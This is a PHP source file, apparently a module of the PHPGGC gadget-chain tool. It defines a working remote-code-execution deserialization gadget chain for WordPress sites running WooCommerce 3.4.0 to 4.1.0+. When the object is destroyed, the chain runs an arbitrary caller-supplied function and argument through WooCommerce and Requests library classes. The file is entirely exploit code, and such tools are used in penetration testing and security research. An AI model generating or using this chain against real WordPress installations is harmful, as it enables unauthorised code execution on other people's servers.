<?php

namespace GadgetChain\WordPress\P\WooCommerce;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '3.4.0 <= 4.1.0+';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    public static $informations = '
        Demonstrated at BSide Manchester: https://www.youtube.com/watch?v=GePBmsNJw6Y&t=1763
        Tested up to WP 5.4.1 and WooCommerce 4.1.0 activated (but not configured). Newest versions might also work.
    ';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \WC_Log_Handler_File(new \Requests_Utility_FilteredIterator([$parameter], $function));
    }
}